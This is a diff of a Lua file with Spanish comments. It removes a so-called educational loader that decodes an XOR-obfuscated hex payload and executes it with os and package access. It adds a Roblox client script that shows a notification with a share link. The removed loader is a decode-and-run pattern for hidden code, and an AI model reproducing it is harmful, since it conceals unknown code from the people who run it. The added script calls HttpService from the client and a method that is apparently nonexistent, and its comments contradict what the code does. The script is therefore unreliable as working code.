@@ -1,61 +1,29 @@
--- redir_obf.lua -- loader educativo: XOR+hex
-local key = "claveEducativa2025" -- clave XOR (puedes cambiarla)
+-- Script en LocalScript (debe ir en StarterPlayerScripts o PlayerGui)
+-- ¡Este script SOLO funciona en el lado del cliente!
 
--- Aquí está el payload cifrado en hex (XOR con la clave anterior).
--- Si cambias la clave, pídeme que regenere el hex para esa clave.
-local hex_string = [[
-3c2b2e31202b6a7d6b5a7e4f3f2a552f6a6b6a6f2b6d2a6b6a6b2a6c2b6a210a
-]]
+local Players = game:GetService("Players")
+local player = Players.LocalPlayer
 
--- util: hex -> bytes
-local function hex_to_bytes(s)
-  s = s:gsub("%s", "")
-  if (#s % 2) ~= 0 then error("hex malformado") end
-  local bytes = {}
-  for i = 1, #s, 2 do
-    local b = tonumber(s:sub(i,i+1), 16)
-    table.insert(bytes, b)
-  end
-  return bytes
-end
+-- URL que quieres compartir (debe ser una URL permitida por Roblox)
+local url = "https://www.roblox.com/share?code=9c01b9f0d829174daf43ea48723b5343&type=Server"
 
--- xor implementation (bytewise)
-local function bxor(a,b)
-  local r = 0
-  local bit = 1
-  while a > 0 or b > 0 do
-    local abit = a % 2
-    local bbit = b % 2
-    if abit ~= bbit then r = r + bit end
-    a = math.floor(a/2)
-    b = math.floor(b/2)
-    bit = bit * 2
-  end
-  return r
-end
-
-local function xor_bytes(bytes, key)
-  local out = {}
-  local klen = #key
-  for i = 1, #bytes do
-    local kb = key:byte(((i-1) % klen) + 1)
-    out[#out+1] = string.char(bxor(bytes[i], kb))
-  end
-  return table.concat(out)
-end
-
--- Decifrar y ejecutar
-local ok, err = pcall(function()
-  local bytes = hex_to_bytes(hex_string)
-  local decoded = xor_bytes(bytes, key)
-  -- Cargamos el chunk en un entorno restringido
-  local env = { print = print, os = os, package = package }
-  setmetatable(env, { __index = _G })
-  local f, load_err = load(decoded, "payload", "t", env)
-  if not f then error("Error cargando payload: "..tostring(load_err)) end
-  return f()
+-- Mostrar notificación con el enlace
+local success, err = pcall(function()
+    game:GetService("StarterGui"):SetCore("SendNotification", {
+        Title = "¡Visita nuestro sitio!",
+        Text = "Haz clic en 'Aceptar' para abrir el enlace.",
+        Duration = 6,
+        Callback = function(btn)
+            if btn == "OK" then
+                -- Intentar abrir el enlace (solo si el jugador hace clic)
+                game:GetService("HttpService"):GetAsync(url) -- Esto NO abre el navegador
+                -- En su lugar, usamos OpenExternalUrl (requiere permisos)
+                game:GetService("Players").LocalPlayer:SendExternalUrl(url)
+            end
+        end
+    })
 end)
 
-if not ok then
-  io.stderr:write("Error al descifrar/ejecutar: " .. tostring(err) .. "\n")
+if not success then
+    warn("No se pudo mostrar la notificación:", err)
 end
